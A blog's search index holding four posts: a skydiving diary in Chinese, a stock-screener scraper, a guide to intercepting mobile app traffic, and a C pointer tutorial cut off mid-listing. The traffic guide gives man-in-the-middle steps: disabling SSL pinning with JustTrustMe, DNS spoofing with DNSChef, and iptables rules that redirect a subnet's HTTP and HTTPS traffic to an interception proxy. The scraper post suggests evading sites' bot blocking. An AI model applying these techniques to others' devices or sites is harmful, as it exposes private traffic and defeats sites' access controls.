<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Skydive at Mission Beach]]></title>
    <url>%2F2019%2F10%2F08%2FSkydive-at-Mission-Beach%2F</url>
    <content type="text"><![CDATA[心生想法跳伞在TODO list上已经躺了很久了，对于跳伞的憧憬从很小很小的时候就开始了，自从最开始在电视上看人跳伞就觉得这是我向往的运动。所幸澳大利亚得益于得天独厚的环境，正是一块跳伞胜地。这次去澳大利亚自驾游可以顺带跳伞，或者说是去跳伞顺带自驾？做个决定挺容易，临近跳伞的那几天逐渐开始焦虑，我做梦都在想绳索会在什么时候断开，要是伞包没扣紧飞了怎么办？以自由落体220km/h的速度接触海面用什么姿势能最小化受力面，同时解决海水深度不够缓冲不足的问题？脑补了一万种硬着陆的方式。我们选择的跳伞地点是凯恩斯的Mission Beach，一大早从酒店出来还下雨，去海滩的一路上还担心跳伞因为天气原因取消了，所幸到了海滩阳光明媚。和我们一同前往的一车人大多数是亚洲面孔，主要是中国人和韩国人，还有几个澳大利亚本地的人。这次跳伞的体验总体来说还不赖。起初只是预定了跳伞的坑位，但是并不知道能不能预定到第三方的拍摄，也就是他们口中的“camera man”，会有另一个摄影师在空中跟拍，效果特别棒，这个通常来说很抢手，基本不可能留给临时打算预约的人，一趟飞机也只能满足一位乘客的这种拍摄需求。跟我们一趟车的一个澳大利亚本地姑娘就是提前预定的这个选项。我在临近跳伞的那几天也挺郁闷的，心想预约不到“camera man”那真是巨大的遗憾啊，我本身是有严重的强迫症，一旦不及自己的预期就会郁闷很长时间。但是在营地现场我看到售票员在介绍各种拍摄内容，然后我就去问了一下能不能预约“camera man”，她说没问题，她可以给我安排，在我还满头雾水的时候，幸福突然降临，我愣了几秒。她说没问题的话就可以登记付款了，然后安排妥当。我一下回过神来，那还用说，当然没问题啊！没等她把话说完我赶紧把卡拿出来塞给她，瞬间心情大好。 在我的教练给我穿装备的时候，他问我感觉怎样，我说很好，有点紧张罢了，他说“why？？”，然后拖着一个意味深长的表情，值得一提的是我看到这表情立马就轻松了许多，从他这表情里能看出异于常人的自信，遂觉稳了。后来我在降落伞打开后问他跳了多少次了，他说有几千次了，对于他们这种每天跳伞次数比上厕所次数还多的人来说，这种运动只是轻轻松松的享受罢了。这些教练都挺幽默亲切的，我们坐车从营地到机场的路上，我坐副驾驶位，开车的老头（50岁左右？）也是个话痨，还吓唬我说他们的飞机是没有舱门的，我不吃这套，whatever，坐门口的反正不是我。车子快到机场的时候教练开始各自检查自己的装备，想反悔这也是最后的机会，上了飞机就没有退路了。上飞机之前camera man跟我说了一大堆关于“give me five”之类的话，在飞机巨大的引擎声音下我大概听清楚了三分之二，反正到时候临场发挥就是了。准确地说这是个camera woman，在上车前我还奇怪这个长相甜美，声音同样甜美的妹子是跟我们去干嘛的，你能想象她现在居然要爬到飞机外面拍摄视频。。。 Big jump话不多说，一行人听从教练的指示上了飞机。起飞之前飞机舱门是开着的，直到飞机在跑道上加速的时候舱门也是开着的！就感受着强大的气流在舱门口呼啸而过！我猜在这种气压差下人是很容易被吸出去的。我不知道坐门口的中国妹子为什么如此淡定，而且门口连个扶手都没有，我刚开始只是静静地坐在自己的位子上，看到这架势立马开始找可以拽的东西，还好我左前方就有一个。这种小飞机不同于平时坐的客机，爬升的坡度特别陡，在短短几分钟之内就要上升到15000英尺的高空。我原本以为在这个高度视野广阔的条件下能够看到地球的曲率，就像图片里这样，真实情况是完全看不到，只是广角镜头的缘故。 令我诧异的是不止我一个人，同飞机的人貌似都很淡定。看着飞机穿过那一片片的云层，心里就越发平静。教练问我感觉怎么样，大概是想舒缓一下我的紧张情绪，然后跟我介绍远方的大堡礁、热带雨林，美不胜收。接着我身后的教练喊了一声”one hundred！“，过了一会儿门口的教练就把飞机舱门打开了。我的个老天，一个不小心就会被外面强大的气流给带出去，尽管当时有28摄氏度左右，在这个高度也感觉凉飕飕的。然后就眼看着门口那一排陆续跳下去了，轮到我的时候我心里没有一点起伏，没有丝毫犹豫，直接就坐在舱门口用脚勾着舱门下方，教练让我把头尽量往他肩膀上靠，所以我整个人就像一个瘫痪的病人一样和教练一起滚了下去。在从舱门口往下跳的这个阶段他们跳伞俱乐部称之为“Big jump”，对于跳伞新手来说这无疑是至暗时刻。坐在舱门口是需要勇气的，为了给教练挪位置，此时几乎半个身子已经悬在机舱外了。不过我个人认为“Big jump”是最酷的部分。这里放一个特写镜头 Free fall跳下去的那一瞬间感觉很奇妙，不是我想象中的那种失重感，很刺激，同时又很稳，这辈子是第一次体验这种没有束缚的自由落体的感觉，纯粹的无拘无束，完全不同于过山车跳楼机。整个跳伞过程中最美好的阶段也莫过于“Free fall”阶段，小时候在电视上看别人高空跳伞很多人在空中排成各种各样的造型，我一直都非常期待有一天能体验这种感觉。失重感只发生在下落的前几秒，当达到自由落体最大速度后便没有失重感了，处于匀速下落过程。在这个高度是无法根据地面物体来判断自己的高度的，只能依靠高度计，如果身边没有云层之类的东西作参照几乎察觉不到自己在以极高的速度逼近地面。美好的时光总是短暂的，整个“Free fall”也不过1分钟左右，甚至还没来得及放空大脑去慢慢感受。开伞的时候会有略微失重的感觉，不过是很短暂的。在天上翱翔的短短几分钟，我觉得人类是如此幸运，这个星球给予人类的阳光、空气、海洋、地心引力，这一切造就了跳伞这种独一无二的运动。借这次澳大利亚之行也结识了不少新朋友，一位跟我们同一架飞机跳伞的妹子，是来澳洲找同学玩的，首先是只身前往凯恩斯跳伞，实在是勇气可嘉。 还有一位在国内认识的妹子也是去澳洲找同学玩的，原本打算有机会的话在澳洲一起组队自驾，后来路线错开了，她也在别的海滩完成了跳伞。（PS：两位妹子的照片都是经过了别人的同意才敢往外放的） 题外话事实上我并不敢说因为自己经历了一次跳伞便有了没什么大不了的心态，以后任何人叫我再来几遍都无所畏惧。我对于跳伞依旧或多或少持不确定的态度，直到我对这个领域足够了解。更重要的是，这次经历很大程度上塑造或者说强化了我的一些人生观。Btw，在跟澳大利亚人交谈的过程中，从他们的字里行间能读出他们对于自然的热爱，对自然的尊敬。下至海底的腔肠动物，哪怕再低等的生物都能在这里得到尊敬。没有谁能够凌驾于谁之上，这或许是澳大利亚人与大自然相处的哲学吧。”There are always things above you.” 最后放上自己剪辑的全过程视频]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Outdoor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[A Quantitative Trading Model with Stock Screener]]></title>
    <url>%2F2019%2F08%2F08%2FA-Quantitative-Trading-Model-with-Stock-Screener%2F</url>
    <content type="text"><![CDATA[Select the key elements to make decisionHere I choose 5 elements including roe, gross profit margin, liabilities, net profit cash flow, payout ratio to analyze stocks. The reason is not within the scope of this post. Finding out all of these data by hand will be a huge work and will be time-consuming. There exists some better ways to speed up this process. Of course, this is the purpose of my writing this post.The stocks we will analyze mainly sold in many different stock markets, such as Shanghai Stock Exchange, Shenzhen Stock Exchange, Hong Kong Exchange, NASDAQ, New York Stock Exchange, American Stock Exchange, etc. We should filter the qualified stocks judged by the important elements we choose. There are a couple of methods to achieve that. This trading model doesn’t contain complicated calculation and most of the work can be done by stock screener sites and tools like excel.There are tons of stock screeners on the Internet. The first thing is to select a useful one, it depends on yourself. https://www.tradingview.com/screener/ https://finance.yahoo.com/screener/ https://www.investing.com/stock-screener/ You may need to grab Details of some information from many different sites. For instance, the dividend payout ratio can be found at https://finbox.com/, and you even need to pay for the data at other sites. For Apple: https://finbox.com/AAPL/explorer/payout_ratio https://finance.yahoo.com/quote/AAPL/key-statistics/ Maybe some sites can be crawled by simple spiders. But most of the requests sent by the spiders will be banned by those sites. Of course, if we add some additional measures we can bypass those tricks. To deal with the interception of high-frequency requests, the easiest way is to set a time delay. Besides, you can even modify the header to pretend the real requests generated by the browsers. For JavaScript encrypted contents, you can read the code and find out your bypass ways. That will be a little bit troublesome. There are other tools like selenium, phantomjs, puppeteer to handle it. And Puppeteer will be a good choice in most situations, it also provides a python module named pyppeteer. Be careful with pyppeteerThe current version of pyppeteer is not stable, it comes from the limitation of python, some asynchronous methods cannot be used in pyppeteer. And I spent considerable time on those confusing problems. For the exception thrown by pyppeteer: 1pyppeteer.errors.NetworkError: Protocol Error (Runtime.callFunctionOn): Session closed. Most likely the page has been closed. The proposal offered in https://github.com/miyakogi/pyppeteer/pull/160/files might be useful, but it doesn’t merge to the latest version, you need to modify the pyppeteer source code by yourself.Sometimes the browser will crash because of small memory space, especially in a container like Docker or something like CI environment. What you want to do is to launch the browser with some arguments like this: 1browser = await launch(&#123;'args': ['--disable-dev-shm-usage']&#125;) The toughest problem I have encountered during the programming is the browser will always be stuck at page.goto step, finally the browser will be closed automatically. I guess the program might have triggered some scripts that will keep running and never come to an end to deal with the headless browsers. This is a big problem and I’m struggling on it from days to days. In the JavaScript version, puppeteer provides a couple of ways to stop the page loading and return all of the content. But I found a good way to implement the same function in the end, to use finally expression. Take a look at the source code of page.goto, this method will raise an exception when it reaches the timeout limit. 12345678910def _createTimeoutPromise(self) -&gt; Awaitable[None]: self._maximumTimer = self._loop.create_future() if self._timeout: errorMessage = f'Navigation Timeout Exceeded: &#123;self._timeout&#125; ms exceeded.' async def _timeout_func() -&gt; None: await asyncio.sleep(self._timeout / 1000) self._maximumTimer.set_exception(TimeoutError(errorMessage)) self._timeout_timer: Union[asyncio.Task, asyncio.Future] = self._loop.create_task(_timeout_func()) Our goal is to handle this exception and stop it from shutting down the program. It can be solved in such an easy way, so funny. 12345678browser = await launch()page = await browser.newPage()try: await page.goto(url, timeout=10000)except Exception as e: print(e)finally: ... The key to the problem is to stop the browser from closing. It may be not so convenient, but it’s robust enough to guarantee the necessary content can be completely fetched without shutting down. OutputThe source code can be found at https://github.com/recursively/quantitative_trading_pub. If you select the American stock market, the final output will be like this: 1234567891011121314151617181920德州仪器 TXNROE: [57.73 35.39 35.21 29.37 26.62]cashflow_profit：[1.44 1.47 1.28 1.46 1.29]gross_profit：[65.11 64.26 61.63 58.15 56.93]debt_ratio：[47.52 41.41 36.26 38.72 40.19]bonus_ratio：[0.45860215 0.57088539 0.4581363 0.48392498 0.47075505]迪士尼 DISROE: [27.97 21.23 21.39 18.73 16.6 ]cashflow_profit：[1.3 1.36 1.4 1.37 1.13]gross_profit：[44.94 45.04 46.09 45.94 45.88]debt_ratio：[45.28 51.82 48.58 44.82 42.74]bonus_ratio：[0.20400064 0.28028953 0.26067511 0.26604629 0.25996534]赛灵思 XLNXROE: [21.18 24.42 21.18 24.17 22.06]cashflow_profit：[1.28 1.25 1.35 1.5 1.6 ]gross_profit：[70.21 69.85 69.65 70.18 68.8 ]debt_ratio：[53.36 47.07 45.99 46.19 44.66]bonus_ratio：[0.70898438 0.55216693 0.59891107 0.48765432 0.47460317] The program will calculate the appropriate price, the result below is from HKEX. 1IGG 00799 Stock code: HK.00799 Last price: 5.75 gprice: 9.81 More to mentionSome implement in the source code needs to be modified to improve the performance. There are too many IO operations in the program, some functions can be replaced by the asynchronous method. Such as the extract_bonus function: 1234567891011121314def extract_bonus(self, stock_code): res = requests.get(self.bonus_url.format(stock_code), headers=config.headers) root = etree.HTML(res.content) years = root.xpath('//*[@id="bonus_table"]/tbody/tr[*]/td[1]/text()') index = [] recent_ratio = [] for idx, val in enumerate(years): if "年报" in val: index.append(idx) ratio = root.xpath('//*[@id="bonus_table"]/tbody/tr[*]/td[9]/text()') for idx, val in enumerate(index): if idx &lt; 5: recent_ratio.append(ratio[val]) Moreover, the browser just requests a single page for every launch. It wastes too much time during the whole procedure. 123456789101112async def extract_debts(self, stock_code): browser = await launch(&#123;'headless': True, 'args': ['--disable-dev-shm-usage']&#125;) page = await browser.newPage() await page.goto(self.debt_url.format(stock_code), &#123;'waitUntil': "networkidle2"&#125;, timeout=60000) await page.waitForSelector('#cwzbTable') await page.click('#cwzbTable &gt; div.scroll_container &gt; ul &gt; li:nth-child(2) &gt; a') all_targets = await page.xpath('//*[@id="cwzbTable"]/div[1]/div[1]/div[4]/table[2]/tbody/tr[11]/td[position()&lt;6]') for item in all_targets: self.debt_ratio.append(await (await item.getProperty('textContent')).jsonValue()) await browser.close() It can be replaced by requesting every page from a new tab instead of restarting the browser.]]></content>
      <categories>
        <category>Trading</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Crawler</tag>
        <tag>Quantitative trading</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Get Network Traffic of Mobile APPs]]></title>
    <url>%2F2019%2F04%2F11%2FGet-Network-Traffic-of-Mobile-APPs%2F</url>
    <content type="text"><![CDATA[About proxiesProxy is generally used to perform a man-in-the-middle attack. But not to just perform the pure MITM attack, it’s convenient to view, analyze and modify the data flow generated by the APPs with a proxy. It’s getting difficult to catch the network traffic on mobile and I’m here to talk about the proposals. Methods to do thatThere are 4 methods listed below, and there are certainly other methods exist in this world, but they’re beyond the scope of this post. Just simply use proxy It’s simple, just get into the settings and set the proxy and port to your own server, and it’s done. This is recommended for most users, but it doesn’t work if the APP doesn’t allow system proxy. use the JustTrustMe module of Xposed(Only available for Android) Xposed is a framework used to hook functions in android and JustTrustMe is a module disables SSL certificate checking. (https://github.com/Fuzion24/JustTrustMe)It aims at solving the HTTPS proxy problem. It’s a powerful tool if you want to view the network traffic of APPs which does certificate pinning.Download Xposed installer(https://repo.xposed.info/module/de.robv.android.xposed.installer) and get it installed on your android device. The JustTrustMe binary can be downloaded from https://github.com/Fuzion24/JustTrustMe/releases/latest, Then install it: 1adb install ./JustTrustMe.apk You can now find that JustTrustMe exists in your Xposed modules. Setting up your own DNS server This is a little bit tricky, it’s briefly illustrated below: An elegant tool used here is DNSChef. (https://github.com/iphelix/dnschef) , modify the dnschef.ini file to adapt to your needs and configure the nameserver and the listening interface. The content changed here is the A records. 1*.amazon.com=10.1.3.210 Start up a DNSChef server: 1python dnschef.py --file=dnschef.ini --nameservers=8.8.8.8 --interface=127.0.0.1 If you’re using APPs within an android virtual machine, remember to change the nameserver of the network adapter you’re using to the loopback interface, then all the DNS requests to your machine will resend to DNSChef. Open listeners in BurpSuite: Find out the target IP of your requested hosts so that BurpSuite can follow the DNS resolution. Assuming that you send a request to www.amazon.com you can get ordinary responses like this: Forward traffic of the router It just does simple traffic forwarding between devices, the problem of SSL certificate pinning should be handled by other tools.If you are using a router which allows forwarding ports in GUI, that will be much easier. And you can also install firmware into your router, OpenWrt is one of the choices. OpenWrt Project is a Linux operating system targeting embedded devices and you can execute shell directives on your router with it. For ports forwarding: 1234567iptables -t nat -A PREROUTING -m iprange --src-range 10.1.3.1-10.1.3.253 -p tcp --dport 80 -j DNAT --to-destination 10.1.3.254:80iptables -t nat -A POSTROUTING -p tcp -d 10.1.3.254 --dport 80 -j MASQUERADEiptables -t nat -A PREROUTING -m iprange --src-range 10.1.3.1-10.1.3.253 -p tcp --dport 443 -j DNAT --to-destination 10.1.3.254:443iptables -t nat -A POSTROUTING -p tcp -d 10.1.3.254 --dport 443 -j MASQUERADE This directive will forward all the network traffic of ip 10.1.3.1~10.1.3.253 at port 80, 443 to ip 10.1.3.254 at port 80, 443. Make it clear: Open the BurpSuite listeners: All that network traffic can be sent directly or through a proxy like mitmproxy(https://github.com/mitmproxy/mitmproxy) listened at port 9010, it’s necessary if you would like to make some changes to the packets. What else?Those proposals mentioned above can handle almost 90% of the situations we will encounter. If it doesn’t work, some tools work at IP based network may be helpful, such as bettercap.(https://github.com/bettercap/bettercap)]]></content>
      <categories>
        <category>Hacking</category>
      </categories>
      <tags>
        <tag>MITM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pointer Manipulations That Should Be Noted]]></title>
    <url>%2F2019%2F02%2F12%2FPointer-Manipulations-That-Should-be-Noted%2F</url>
    <content type="text"><![CDATA[Double pointerWhich means the pointer to pointer. Take a look at this program. 1234567891011void GetMemory(char *p)&#123; p = (char *)malloc(100);&#125;void Test(void)&#123; char *str = NULL; GetMemory(str); strcpy(str, "hello world"); printf(str);&#125; If we directly test this program it will be aborted by throwing an exception. As we all know, the arguments are passed to functions by value in C/C++. So it’s clear that the pointer str passed into the function GetMemory is a copy of real str. We can fix this program by using a double pointer. 12345678910void GetMemory(char **p)&#123; *p = (char *)malloc(100);&#125;void Test(void)&#123; char *str = NULL; GetMemory(&amp;str); strcpy(str, "hello world\n"); printf(str); Simplify code by using pointersHere gives an implement of linked list: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;//节点typedef struct s_node&#123; //关键字 int key; //下一个节点指针 struct s_node *next;&#125; s_node;//链表typedef struct s_list&#123; //头节点 struct s_node *header;&#125; s_list;int list_insert(s_list *list, int key)&#123; if (list == NULL) &#123; return -1; &#125; //创建新节点 s_node *n = malloc(sizeof(s_node)); n-&gt;key = key; n-&gt;next = NULL; //如果链表头为空，表头即为新节点 if (list-&gt;header == NULL) &#123; list-&gt;header = n; return 0; &#125; //如果关键字key小于链表头的key if (key &lt; list-&gt;header-&gt;key) &#123; //替换新节点为链表头，原表头变为新节点的next n-&gt;next = list-&gt;header; list-&gt;header = n; return 0; &#125; //遍历链表，保持待比较节点的前一个节点 s_node *p = list-&gt;header; //找到第一个大于新节点key的节点（注意，此时p其实是这个节点的上一个节点） while (p-&gt;next != NULL &amp;&amp; p-&gt;next-&gt;key &lt; key) &#123; p = p-&gt;next; &#125; //插入新节点 n-&gt;next = p-&gt;next; p-&gt;next = n; return 0;&#125;int main() &#123; s_list testlist; list_insert(&amp;testlist, 5); list_insert(&amp;testlist, 8); list_insert(&amp;testlist, 7); list_insert(&amp;testlist, 10);&#125; We must adjust the relations between members of the linked list properly without the help of pointer. This code can be much briefer in the pointer version. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;//节点typedef struct s_node&#123; //关键字 int key; //下一个节点指针 struct s_node *next;&#125; s_node;//链表typedef struct s_list&#123; //头节点 struct s_node *header;&#125; s_list;int list_insert2(s_list *list, int key)&#123; if (list == NULL) &#123; return -1; &#125; //创建新节点 s_node *n = malloc(sizeof(s_node)); n-&gt;key = key; n-&gt;next = NULL; //二级指针 s_node **p = &amp;list-&gt;header; //找到第一个大于key的节点 while ((*p) != NULL &amp;&amp; (*p)-&gt;key &lt; key) &#123; p = &amp;(*p)-&gt;next; &#125; //插入新节点 n-&gt;next = *p; *p = n; return 0;&#125;int main() &#123; s_list testlist; list_insert2(&amp;testlist, 5); list_insert2(&amp;testlist, 8); list_insert2(&amp;testlist, 7); list_insert2(&amp;testlist, 10);&#125; It can be clearer by giving a diagram: Those examples we saw above is easy to understand. Let’s dive in some instances which are a little bit confusing. When to pass address?Take a look at this code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#include&lt;stdio.h&gt;#include &lt;string.h&gt;#include&lt;stdlib.h&gt;#include &lt;mcheck.h&gt;#define false 0#define true 1//结构体类型，每个导师有三个学生typedef struct Tea &#123; char *tName; //导师名字，需要动态分配空间char *====&gt;char char **stu; //三个学生，需要动态分配空间，堆区数组 int age; &#125;Teacher;//在createTeacher中分配空间//n1 =3; //导师个数//n2 = 3 //学生int createTeacher(Teacher **p, int n1, int n2) &#123; int len=0; int i,j,k; //分配3个Student信息 *p = (Teacher*)malloc (sizeof(Teacher)*3); for (i=0;i&lt;n1;i++) //分配3个导师的地址空间 &#123; (*p)[i].tName=(char *)malloc (sizeof(char)*20); if ((*p)[i].tName == NULL) &#123; return false; &#125; &#125; //(*p)-&gt;stu=(char **)malloc (sizeof(char*)*3); for (j=0;j&lt;n2;j++) &#123; (*p)[j].stu=(char **)malloc (sizeof(char*)*3); if ((*p)[j].stu == NULL) &#123; return false; &#125; for (k=0;k&lt;3;k++) &#123; (*p)[j].stu[k]=(char *)malloc (sizeof(char)*20); if ((*p)[j].stu[k] == NULL) &#123; return false; &#125; &#125; &#125; return true; &#125;//给成员赋值void initTeacher(Teacher *p, int n1, int n2) &#123; int i,j,k=0; // if (p == NULL) &#123; printf ("error\n"); &#125; //n1 =3; //导师个数 //n2 = 3 //学生 puts ("-----导师赋值------"); for (i=0;i&lt;n1;i++) &#123; char *buf[]=&#123;"王教授","陆教授","田导师"&#125;; p[i].age=22+i; //printf ("%d",p[i].age); strcpy (p[i].tName,buf[i]); // printf ("%s",p[i].tName); for (j=0;j&lt;n2;j++) &#123; char *arr[]=&#123;"小黎","小田","小张","小王","小胡","小范", "小杨","小石","小柯"&#125;; strcpy (p[i].stu[j],arr[k]); ++k; // printf ("%s\n",p[i].stu[j]); &#125; &#125; &#125;//打印结构体成员信息void printTeacher(Teacher *p, int n1, int n2) &#123; int i,j; if (p == NULL) &#123; printf ("error\n"); &#125; for (i=0;i&lt;n1;i++) &#123; printf ("\t\t%s\n",p[i].tName); //导师 for (j=0;j&lt;n2;j++) &#123; printf ("\t%s",p[i].stu[j]); &#125; putchar('\n'); printf ("\t\t%d\n\n",p[i].age); &#125; &#125;//释放空间，在函数内部把p赋值为NULLvoid freeTeacher(Teacher **p, int n1, int n2) &#123; int i,j; if (p == NULL) &#123; printf ("Empty\n"); &#125; else &#123; for (i=0;i&lt;n1;i++) &#123; for (j=0;j&lt;n2;j++) &#123; if ((*p)[i].stu[j]!=NULL) &#123; free ((*p)[i].stu[j]); (*p)[i].stu[j]=NULL; &#125; &#125; if ((*p)[i].stu!= NULL) &#123; free ((*p)[i].stu); (*p)[i].stu=NULL; &#125; free ((*p)[i].tName); (*p)[i].tName=NULL; &#125; free (*p); *p=NULL; &#125; &#125;int main(void) &#123; int ret = 0; int n1 = 3; //导师个数 int n2 = 3; //学生 Teacher *p = NULL; setenv("MALLOC_TRACE","1.txt",1); mtrace(); ret = createTeacher(&amp;p, n1, n2); if (ret == false) &#123; printf("createTeacher err:%d\n", ret); exit (EXIT_FAILURE); &#125; initTeacher(p, n1, n2); //给成员赋值 printTeacher(p, n1, n2); //释放空间，在函数内部把p赋值为NULL freeTeacher(&amp;p, n1, n2); // muntrace(); // system("pause"); return 0; &#125; I paste the code of function createTeacher2 below and here comes the question, can we just simply replace the function createTeacher to createTeacher2? 12345678910111213141516171819202122232425262728293031323334int createTeacher2(Teacher *p, int n1, int n2) &#123; int len=0; int i,j,k; //分配3个Student信息 p = (Teacher*)malloc (sizeof(Teacher)*3); for (i=0;i&lt;n1;i++) //分配3个导师的地址空间 &#123; (p)[i].tName=(char *)malloc (sizeof(char)*20); if ((p)[i].tName == NULL) &#123; return false; &#125; &#125; //(*p)-&gt;stu=(char **)malloc (sizeof(char*)*3); for (j=0;j&lt;n2;j++) &#123; (p)[j].stu=(char **)malloc (sizeof(char)*3); if ((p)[j].stu == NULL) &#123; return false; &#125; for (k=0;k&lt;3;k++) &#123; (p)[j].stu[k]=(char *)malloc (sizeof(char)*20); if ((p)[j].stu[k] == NULL) &#123; return false; &#125; &#125; &#125; return true; &#125; Modify the code in main(): 1ret = createTeacher2(p, n1, n2); This code can be correctly compiled and if we run the program we will get stuck in the step of initTeacher. Because the pointer p passed to createTeacher2 wasn’t allocated memory due to the pass-by-value feature. In other words, the pointer p in the main() block will always point to NULL. To fix it, we should use the double pointer to pass the address of pointer p. There is another example we should take care of. Here is an implement of a binary search tree. 12345678910111213141516171819202122232425262728//binarysearchtree.h#ifndef __BINARY_SEARCH_TREE__#define __BINARY_SEARCH_TREE__typedef int mytype;typedef struct _bstree_node&#123; mytype data; struct _bstree_node *lchild; struct _bstree_node *rchild;&#125;bstree_node;typedef struct _bstree&#123; int size; int (*compare)(mytype key1,mytype key2); int (*destory)(mytype data); bstree_node *root;&#125;bstree;typedef int (*compare_fuc)(mytype key1,mytype key2);typedef int (*destory_fuc)(mytype data);#define bstree_is_empty(tree) (tree-&gt;size == 0)bstree *bstree_create(compare_fuc compare,destory_fuc destory);#endif 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317//binarysearchtree.c#include&lt;assert.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include"binarysearchtree.h"bstree *bstree_create(compare_fuc compare,destory_fuc destory)&#123; bstree *tree = NULL; tree = (bstree*)malloc(sizeof(bstree)); if (tree == NULL) &#123; return NULL; &#125; tree-&gt;size = 0; tree-&gt;compare = compare; tree-&gt;destory = destory; tree-&gt;root = NULL; return tree;&#125;bstree_node *bstree_search(bstree *tree,mytype data)&#123; bstree_node *node = NULL; int res = 0; if ((tree == NULL) || (bstree_is_empty(tree))) &#123; return NULL; &#125; node = tree-&gt;root; while(node != NULL) &#123; res = tree-&gt;compare(data,node-&gt;data); if(res == 0) &#123; return node; &#125; else if (res &gt; 0) &#123; node = node-&gt;rchild; &#125; else &#123; node = node-&gt;lchild; &#125; &#125; return NULL;&#125;int bstree_insert(bstree * tree, mytype data)&#123; printf("second ptr address: %p", &amp;tree); bstree_node *node = NULL; bstree_node *tmp = NULL; int res = 0; if (tree == NULL) &#123; return -1; &#125; node = (bstree_node *)malloc(sizeof(bstree_node)); if (node == NULL) &#123; return -2; &#125; node-&gt;data = data; node-&gt;lchild = NULL; node-&gt;rchild = NULL; /*如果二叉树为空，直接挂到根节点*/ if (bstree_is_empty(tree)) &#123; tree-&gt;root = node; tree-&gt;size++; return 0; &#125; tmp = tree-&gt;root; while(tmp != NULL) &#123; res = tree-&gt;compare(data,tmp-&gt;data); if (res &gt; 0) /*去右孩子查找*/ &#123; if (tmp-&gt;rchild == NULL) &#123; tmp-&gt;rchild = node; tree-&gt;size++; return 0; &#125; tmp = tmp-&gt;rchild; &#125; else /*去左孩子查找*/ &#123; if(tmp-&gt;lchild == NULL) &#123; tmp-&gt;lchild = node; tree-&gt;size++; return 0; &#125; tmp = tmp-&gt;lchild; &#125; &#125; return -3;&#125;int bstree_delete(bstree *tree,mytype data)&#123; bstree_node *node = NULL;/*要删除的节点*/ bstree_node *pnode = NULL;/*要删除节点的父节点*/ bstree_node *minnode = NULL;/*要删除节点的父节点*/ bstree_node *pminnode = NULL;/*要删除节点的父节点*/ mytype tmp = 0; int res = 0; if ((tree == NULL) || (bstree_is_empty(tree))) &#123; return -1; &#125; node = tree-&gt;root; while ((node != NULL) &amp;&amp; ((res = tree-&gt;compare(data,node-&gt;data)) != 0)) &#123; pnode = node; if(res &gt; 0) &#123; node = node-&gt;rchild; &#125; else &#123; node = node-&gt;lchild; &#125; &#125; /*说明要删除的节点不存在*/ if (node == NULL) &#123; return -2; &#125; /*1、如果要删除node有2个子节点，需要找到右子树的最小节点minnode， * 更新minnode和node节点数据，这样minnode节点就是要删除的节点 * 再更新node和pnode节点指向要删除的节点*/ if ((node-&gt;lchild != NULL) &amp;&amp; (node-&gt;rchild != NULL)) &#123; minnode = node-&gt;rchild; pminnode = node; while(minnode-&gt;lchild != NULL) &#123; pminnode = minnode; minnode = minnode-&gt;lchild; &#125; /*node 节点和minnode节点数据互换*/ tmp = node-&gt;data; node-&gt;data = minnode-&gt;data; minnode-&gt;data = tmp; /*更新要删除的节点和其父节点*/ node = minnode; pnode = pminnode; &#125; /*2、当前要删除的节点只有左孩子或者右孩子时，直接父节点的直向删除的节点*/ if (node-&gt;lchild != NULL) &#123; minnode = node-&gt;lchild; &#125; else if (node-&gt;rchild != NULL) &#123; minnode = node-&gt;rchild; &#125; else &#123; minnode = NULL; &#125; if (pnode == NULL)/*当要删除的时根节点时,*/ &#123; tree-&gt;root = minnode; &#125; else if (pnode-&gt;lchild == node) &#123; pnode-&gt;lchild = minnode; &#125; else &#123; pnode-&gt;rchild = minnode; &#125; tree-&gt;size--; free (node); return 0;&#125;/*采用递归方式删除节点*/void bstree_destory_node(bstree *tree,bstree_node *root)&#123; if (root == NULL) &#123; return; &#125; bstree_destory_node(tree,root-&gt;lchild); bstree_destory_node(tree,root-&gt;rchild); free(root);&#125;/*二叉搜索树销毁*/void bstree_destory(bstree *tree)&#123; bstree_destory_node(tree,tree-&gt;root); free(tree); return;&#125;/*中序遍历打印树节点*/void bstree_inorder_node(bstree_node *root)&#123; bstree_node *node = NULL; if (root == NULL) &#123; return; &#125; bstree_inorder_node(root-&gt;lchild); printf(" %d ",root-&gt;data); bstree_inorder_node(root-&gt;rchild); return;&#125;void bstree_dump(bstree *tree)&#123; bstree_node *node = NULL; if ((tree == NULL) || (bstree_is_empty(tree))) &#123; printf("\r\n 当前树是空树"); &#125; printf("\r\nSTART-----------------%d------------\r\n",tree-&gt;size); bstree_inorder_node(tree-&gt;root); printf("\r\nEND---------------------------------",tree-&gt;size);&#125;int bstree_compare(mytype key1,mytype key2)&#123; if (key1 == key2) &#123; return 0; &#125; else if (key1 &gt; key2) &#123; return 1; &#125; else &#123; return -1; &#125;&#125;int main()&#123; bstree *tree = NULL; bstree_node *node = NULL; mytype data = 0; int res = 0; setenv("MALLOC_TRACE","1.txt",1); mtrace(); tree = bstree_create(bstree_compare,NULL); printf("first address: %d", tree); assert(tree != NULL); while(1) &#123; printf("\r\n插入一个数字，输入100时退出："); scanf("%d",&amp;data); if(data == 100)break; res = bstree_insert(tree,data); printf("\r\n %d 插入%s成功",data,(res != 